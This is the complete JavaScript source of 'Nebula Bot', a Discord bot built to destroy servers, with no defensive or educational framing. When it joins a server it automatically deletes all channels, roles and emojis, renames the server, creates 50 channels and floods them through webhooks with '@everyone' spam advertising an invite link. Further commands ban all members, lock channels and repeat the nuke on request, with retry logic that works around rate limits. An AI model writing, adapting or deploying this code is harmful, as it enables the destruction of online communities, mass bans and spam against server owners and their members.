const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fetch = require('node-fetch');
dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER (Keep Alive) ======
const app = express();
app.get('/', (req, res) => res.send('Nebula Bot is online and ready to nuke.'));
app.listen(process.env.PORT || 3000, () => console.log('🌐 Web server running on port 3000'));

// ====== RATE LIMIT HANDLER (Exponential Backoff) ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = (error.retry_after || 1000) * (1.5 ** retries);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  if (!guild?.available || !guild.members.me) return;
  await handleRateLimit(() => guild.leave()).catch(() => {});
  console.log('🚪 Left server.');
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('discord.gg/migh', { type: 'PLAYING' });
});

// ====== AUTO-NUKE ON JOIN (FAST + SYNCED SPAM) ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const SPAM = '@everyone discord.gg/migh';

  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked: ${guild.name}`);
    return safeLeaveGuild(guild);
  }

  console.log(`🎯 Auto-nuking: ${guild.name}`);
  let totalSent = 0;

  // === PARALLEL CLEANUP ===
  await Promise.allSettled([
    ...guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
    ...guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
    ...guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
  ]);

  await handleRateLimit(() => guild.setName('discord.gg/migh'));

  // === CREATE 50 CHANNELS ===
  const channels = [];
  const createPromises = [];
  for (let i = 0; i < 50; i++) {
    createPromises.push(
      handleRateLimit(() => guild.channels.create({ name: `neb-${i + 1}` }))
        .then(ch => ch && channels.push(ch))
        .catch(() => {})
    );
    if (i % 10 === 0) await new Promise(r => setTimeout(r, 10));
  }
  await Promise.allSettled(createPromises);

  // === CREATE WEBHOOKS + SYNCED SPAM ===
  const spamTasks = [];
  for (const ch of channels) {
    const wh = await handleRateLimit(() => ch.createWebhook({ name: 'neb' }).catch(() => null));
    if (wh) {
      for (let i = 0; i < 20 && totalSent < 1000; i++) {
        spamTasks.push(
          handleRateLimit(() => wh.send(SPAM))
            .then(() => totalSent++)
            .catch(() => {})
        );
      }
    } else {
      for (let i = 0; i < 10 && totalSent < 1000; i++) {
        spamTasks.push(
          handleRateLimit(() => ch.send(SPAM))
            .then(() => totalSent++)
            .catch(() => {})
        );
      }
    }
  }

  await Promise.allSettled(spamTasks);
  if (totalSent >= 950) await safeLeaveGuild(guild);
});

// ====== MESSAGE HANDLER (All Commands) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  const BLOCKED = '1345474714331643956';
  const OWNER = '1400281740978815118';

  if (['ba', 'rip', 'nuke', 'lock'].includes(cmd) && message.guild.id === BLOCKED) {
    return message.reply('🚫 This command is disabled here.');
  }

  // ===== HELP =====
  if (cmd === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🔥 Nebula Bot')
      .setDescription('Total server destruction at your fingertips.')
      .setColor('#ff0000')
      .setFooter({ text: 'discord.gg/migh' })
      .addFields(
        { name: '.rip', value: 'Full nuke + 50 channels + spam' },
        { name: '.ba', value: 'Ban all members' },
        { name: '.setname <text>', value: 'Rename server' },
        { name: '.seticon <url>', value: 'Change server icon' },
        { name: '.spam <count> <msg>', value: 'Spam current channel' },
        { name: '.createchannels <count> <name>', value: 'Create many channels' },
        { name: '.nuke <name> <msg>', value: 'Custom nuke' },
        { name: '.lock', value: 'Lock all channels' },
        { name: '.servers', value: 'List servers (owner only)' }
      );
    try {
      await message.author.send({ embeds: [embed] });
      message.reply('📬 Help sent to DMs!');
    } catch {
      message.reply('❌ Enable DMs to see help.');
    }
  }

  // ===== OWNER: .servers =====
  if (cmd === 'servers' && message.author.id === OWNER) {
    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers')
      .setColor('#00ffff');
    client.guilds.cache.forEach(g => embed.addFields({ name: g.name, value: `ID: ${g.id}` }));
    await message.author.send({ embeds: [embed] }).catch(() => {});
    message.reply(`✅ In ${client.guilds.cache.size} servers.`);
  }

  // ===== .ba (Ban All) - No User Perms Required =====
  if (cmd === 'ba') {
    const g = message.guild;
    const owner = g.ownerId;
    const members = await g.members.fetch();
    const toBan = members.filter(m => m.id !== owner && !m.user.bot && m.bannable);

    message.reply(`🔪 Banning ${toBan.size} members...`);
    let count = 0;
    for (const m of toBan.values()) {
      await handleRateLimit(() => g.members.ban(m, { reason: 'Nebula Mass Ban', deleteMessageSeconds: 604800 }));
      count++;
      if (count % 10 === 0) await new Promise(r => setTimeout(r, 500));
    }
    message.reply(`✅ Banned ${count} members.`);
  }

  // ===== .setname =====
  if (cmd === 'setname') {
    const name = args.join(' ');
    if (!name) return message.reply('❌ Usage: `.setname My Server`');
    await handleRateLimit(() => message.guild.setName(name));
    message.reply(`✅ Server renamed to \`${name}\``);
  }

  // ===== .seticon =====
  if (cmd === 'seticon') {
    const url = args[0];
    if (!url) return message.reply('❌ Usage: `.seticon <url>`');
    await handleRateLimit(() => message.guild.setIcon(url));
    message.reply('✅ Server icon updated.');
  }

  // ===== .spam =====
  if (cmd === 'spam') {
    const count = Math.min(parseInt(args[0]) || 5, 100);
    const msg = args.slice(1).join(' ') || '@everyone CRASHED';
    for (let i = 0; i < count; i++) {
      handleRateLimit(() => message.channel.send(msg));
      await new Promise(r => setTimeout(r, 50));
    }
    message.reply(`✅ Spammed ${count} times.`);
  }

  // ===== .createchannels =====
  if (cmd === 'createchannels') {
    const count = Math.min(parseInt(args[0]) || 10, 50);
    const name = args.slice(1).join('-') || 'crashed';
    for (let i = 0; i < count; i++) {
      handleRateLimit(() => message.guild.channels.create({ name: `${name}-${i + 1}` }));
      await new Promise(r => setTimeout(r, 50));
    }
    message.reply(`✅ Created ${count} channels.`);
  }

  // ===== .nuke (Custom) =====
  if (cmd === 'nuke') {
    const name = args[0] || 'discord.gg/migh';
    const spam = args.slice(1).join(' ') || '@everyone NUKED';
    const g = message.guild;
    let sent = 0;

    await Promise.allSettled([
      ...g.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
      ...g.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
      ...g.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
    ]);

    await handleRateLimit(() => g.setName(name));

    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(() => g.channels.create({ name: `crash-${i + 1}` }));
      if (ch) channels.push(ch);
    }

    const tasks = [];
    for (const ch of channels) {
      const wh = await handleRateLimit(() => ch.createWebhook({ name: 'neb' }).catch(() => null));
      if (wh) {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          tasks.push(
            handleRateLimit(() => wh.send(spam))
              .then(() => sent++)
              .catch(() => {})
          );
        }
      }
    }

    await Promise.allSettled(tasks);
    await safeLeaveGuild(g);
    message.reply(`✅ Nuked with name \`${name}\` and message \`${spam}\``);
  }

  // ===== .lock =====
  if (cmd === 'lock') {
    message.guild.channels.cache.forEach(ch => {
      handleRateLimit(() => ch.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false }));
    });
    message.reply('🔒 All channels locked.');
  }

  // ===== .rip =====
  if (cmd === 'rip') {
    const g = message.guild;
    let sent = 0;

    await Promise.allSettled([
      ...g.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
      ...g.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
      ...g.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
    ]);

    await handleRateLimit(() => g.setName('discord.gg/migh'));

    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(() => g.channels.create({ name: `neb-${i + 1}` }));
      if (ch) channels.push(ch);
    }

    const tasks = [];
    for (const ch of channels) {
      const wh = await handleRateLimit(() => ch.createWebhook({ name: 'neb' }).catch(() => null));
      if (wh) {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          tasks.push(
            handleRateLimit(() => wh.send('@everyone discord.gg/migh'))
              .then(() => sent++)
              .catch(() => {})
          );
        }
      }
    }

    await Promise.allSettled(tasks);
    await safeLeaveGuild(g);
    message.reply(`✅ Nuked. ${sent} messages sent.`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
